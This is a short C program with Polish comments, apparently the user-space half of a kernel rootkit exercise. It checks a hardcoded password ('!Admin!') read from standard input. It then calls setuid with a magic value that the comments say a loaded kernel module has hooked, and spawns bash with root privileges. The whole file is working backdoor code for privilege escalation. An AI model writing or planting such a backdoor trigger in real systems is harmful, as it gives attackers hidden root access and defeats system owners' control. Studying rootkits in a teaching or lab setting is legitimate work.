#include <unistd.h>

int main()
{

    char bufor[256];
    read(0,bufor,7);    // za pomocą funkcji systemowej read() czytamy ze standardowego wejścia tylko 7 znaków(dokładnie tyle ile ma hasło) i zapisujemy w buforze
    if(!strncmp(bufor,"!Admin!",7))    
    {	
        if (setuid(15290) == -1) //wywołujemy funkcję systemową setuid() którą podmieniliśmy modułem jądra i od razu sprawdzamy czy zwróciła błąd
        {
			perror("setuid"); //jeśli zwróci błąd, to wywalamy błąd funckją perror() - print error message 
			return 1;          //i kończymy program
        }	
				// jeśli przebieg wykonania programu dojdzie tutaj, to oznacza że setuid(15290) wykonała się poprawnie
        execlp("bash", "bash", NULL); // jeśli moduł był załadowany to w tym momencie (po wykonaniu setuid(15290) mamy uprawnienia roota, więc tworzymy nową powłoke
					
	
    }


}
